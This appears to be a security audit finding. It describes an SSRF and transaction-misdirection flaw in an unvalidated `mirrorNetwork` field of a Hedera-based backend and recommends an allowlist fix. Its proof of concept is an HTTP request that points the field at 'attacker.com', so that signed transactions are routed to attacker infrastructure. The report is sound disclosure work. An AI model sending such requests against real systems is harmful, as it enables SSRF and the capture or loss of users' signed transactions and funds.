Audit Report

## Title
Unvalidated `mirrorNetwork` Field Allows Arbitrary Network Routing and SSRF During Transaction Execution

## Summary
The `mirrorNetwork` field in `CreateTransactionDto` accepts any non-empty string with no allowlist enforcement. The raw value is persisted to the database and later used by `ExecuteService._executeTransaction` to build a Hedera SDK client, causing the backend to make outbound gRPC connections to any attacker-supplied host and to submit signed transactions against attacker-controlled infrastructure.

## Finding Description

**Root cause — no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` declares `mirrorNetwork` with only `@IsNotEmpty()` and `@IsString()` — no enum constraint, no allowlist against `mainnet | testnet | previewnet | local-node`: [1](#0-0) 

**Step 1 — creation path stores the raw value:**

`createTransactions` passes `dtos[0].mirrorNetwork` directly to `getClientFromNetwork` and then persists `data.mirrorNetwork` (which equals `dto.mirrorNetwork`) verbatim into the `Transaction` row: [2](#0-1) [3](#0-2) 

**Step 2 — `getClientFromNetwork` makes an outbound gRPC connection to the supplied URL:**

When the value is not one of the four known strings, the function falls through to the custom-network branch, calls `MirrorNetworkGRPC.fromBaseURL(mirrorNetwork[0])`, and executes an `AddressBookQuery` against that host: [4](#0-3) 

**Step 3 — execution path re-uses the stored value:**

`ExecuteService._executeTransaction` calls `getClientFromNetwork(transaction.mirrorNetwork)` with the persisted value, then submits the fully-signed transaction to whatever nodes the attacker's address-book response advertised: [5](#0-4) [6](#0-5) 

**Node validation is bypassed:**

`validateAndPrepareTransaction` calls `getNodeAccountIdsFromClientNetwork(client)` to build the allowed-node set, but `client` was already built from the attacker-controlled address book, so the attacker controls which node IDs are considered valid: [7](#0-6) 

## Impact Explanation

- **SSRF**: The backend makes at least two outbound gRPC connections to an attacker-controlled host per transaction lifecycle (once at creation, once at execution). This can be used to probe internal services reachable from the backend pod.
- **Transaction misdirection**: Fully-signed multi-party transactions (potentially carrying significant HBAR or token operations) are submitted to attacker-controlled infrastructure instead of the real Hedera network. The attacker receives the signed transaction bytes, can withhold submission, replay them, or observe sensitive transaction contents.
- **Cross-network confusion**: An attacker can store `mirrorNetwork: "mainnet"` for a transaction whose bytes were intended for testnet (or vice versa), causing execution on the wrong network and potential permanent loss of funds.

## Likelihood Explanation

Any authenticated organization-mode user can reach `POST /transactions` without elevated privilege. The `mirrorNetwork` field is a normal part of the API contract. No leaked credentials or admin access are required. The attacker only needs to run a gRPC server that speaks the Hedera SDK's `AddressBookQuery` protocol, which is publicly documented.

## Recommendation

Add an allowlist validator to `mirrorNetwork` in `CreateTransactionDto`. For example, using `class-validator`'s `@IsIn`:

```typescript
import { IsIn, IsNotEmpty, IsString } from 'class-validator';

@IsNotEmpty()
@IsString()
@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])
mirrorNetwork: string;
```

If custom mirror networks are a legitimate product feature, they should be managed through a separate admin-controlled configuration table rather than accepted as free-form user input at transaction creation time.

## Proof of Concept

```
POST /transactions
Authorization: Bearer <valid_org_user_token>
Content-Type: application/json

{
  "name": "SSRF Test",
  "description": "SSRF via mirrorNetwork",
  "transactionBytes": "<valid_hex_encoded_transaction>",
  "creatorKeyId": <valid_key_id>,
  "signature": "<valid_signature_hex>",
  "mirrorNetwork": "attacker.com"
}
```

1. Backend calls `getClientFromNetwork("attacker.com")` → gRPC to `attacker.com:443` (SSRF hit #1, triggered at creation).
2. Attacker's gRPC server returns a crafted address book pointing to attacker-controlled Hedera nodes.
3. `isTransactionValidForNodes` passes because the allowed-node set is derived from the attacker's address book.
4. Transaction is saved with `mirrorNetwork = "attacker.com"`.
5. When the chain service executes the transaction, `_executeTransaction` calls `getClientFromNetwork("attacker.com")` again (SSRF hit #2) and submits the signed transaction bytes to the attacker's nodes.
